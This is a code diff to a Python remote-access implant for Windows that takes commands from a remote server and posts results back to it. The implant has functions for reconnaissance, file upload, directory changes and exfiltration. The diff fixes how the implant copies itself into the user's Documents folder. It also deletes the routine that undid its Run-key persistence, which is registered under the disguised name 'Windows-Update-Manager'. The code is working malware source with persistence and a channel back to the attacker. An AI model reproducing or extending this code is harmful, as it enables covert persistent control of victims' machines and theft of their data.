@@ -83,9 +83,9 @@ def put(command, session, base_url):
 
 def system_recon():
     source = sys.argv[0]
-    file_name = sys.argv[0].split('/')[-1]
+    file_name = sys.argv[0].split('\\')[-1]
     user_profile = os.getenv('userprofile')
-    destination = user_profile + '\\Documents\\' + __file__
+    destination = user_profile + '\\Documents\\' + file_name
     return source, file_name, user_profile, destination
 
 
@@ -115,31 +115,6 @@ def persistence(command, session, base_url):
 
         output_server += f'\t[X] Register update...\n'
         session.post(url=base_url, data=output_server)
-
-
-def persistence_remove(command, session, base_url):
-    source, file_name, user_profile, destination = system_recon()
-
-    if os.path.exists(destination):
-        output_server = ''
-        os.remove(destination)
-        output_server += f'\t[X] File "{file_name}" deleted...\n'
-
-        with winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run",
-                0,
-                winreg.KEY_ALL_ACCESS
-        ) as key:
-            winreg.DeleteValue(
-                key,
-                'Windows-Update-Manager'
-            )
-
-        output_server += f'\t[X] Register cleaned...\n'
-        session.post(url=base_url, data=output_server)
-    else:
-        session.post(url=base_url, data='\t[X] System not persisted...\n')
 
 
 def cd(command, session, base_url):
@@ -200,8 +175,6 @@ def main(args):
             put(command, session, base_url)
         elif 'persistence' in command:
             persistence(command, session, base_url)
-        elif 'remove' in command:
-            persistence_remove(command, session, base_url)
         elif 'cd' in command:
             cd(command, session, base_url)
         elif 'exfil' in command:
